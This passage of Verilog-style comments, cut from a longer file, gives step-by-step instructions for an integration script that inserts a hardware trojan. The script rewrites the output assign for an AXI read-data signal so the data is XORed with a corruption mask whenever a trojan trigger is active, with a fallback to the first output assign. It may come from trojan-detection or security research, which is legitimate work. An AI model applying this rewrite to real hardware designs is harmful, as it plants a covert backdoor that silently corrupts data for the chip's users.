...
//
// IMPORTANT: axi_rdata may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If axi_rdata is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for axi_rdata (or first output assign):
//     assign axi_rdata = <expr>;
//   Replace with:
//     assign axi_rdata = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
